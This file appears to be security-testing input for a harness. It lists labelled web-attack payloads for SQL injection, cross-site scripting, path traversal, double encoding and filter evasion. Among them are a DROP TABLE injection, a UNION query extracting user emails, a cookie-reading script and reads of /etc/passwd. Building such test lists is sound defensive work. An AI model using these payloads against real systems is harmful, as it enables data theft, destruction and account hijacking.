# SQL injection
SQLi|' OR 1=1--
SQLi|' OR '1'='1
SQLi|admin'--
SQLi|1' UNION SELECT NULL,NULL--
SQLi|x' UNION SELECT id,email FROM Users--
SQLi|" OR 1=1--
SQLi|1 OR 1=1
SQLi|') OR ('1'='1
SQLi|'; DROP TABLE Users;--
SQLi|1' AND SLEEP(5)--
SQLi|' OR 'a'='a
SQLi|admin' #
# Cross-site scripting
XSS|<script>alert(1)</script>
XSS|<img src=x onerror=alert(1)>
XSS|<svg onload=alert(1)>
XSS|<a href="javascript:alert(1)">x</a>
XSS|<iframe src="javascript:alert(1)">
XSS|<body onfocus=alert(1) autofocus>
XSS|<img src=x onmouseover=alert(1)>
XSS|<ScRiPt>alert(1)</sCrIpT>
XSS|<input autofocus onfocus=alert(1)>
XSS|"><script>alert(document.cookie)</script>
# Path traversal
PathTraversal|../../etc/passwd
PathTraversal|..\..\windows\win.ini
PathTraversal|....//....//etc/passwd
PathTraversal|%2e%2e%2f%2e%2e%2fetc%2fpasswd
PathTraversal|/etc/passwd
PathTraversal|..%c0%af..%c0%afetc/passwd
# Already-encoded payloads (the harness encodes them once more, so they arrive double-encoded)
DoubleEncoded|%27%20OR%201%3D1--
DoubleEncoded|%27%20OR%201%3D1
DoubleEncoded|%3Cscript%3Ealert(1)%3C%2Fscript%3E
DoubleEncoded|%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
# Obfuscation tricks
Obfuscation|<scr%00ipt>alert(1)</script>
Obfuscation|1 UNION/**/SELECT 1,2
Obfuscation|1 oR 2=2
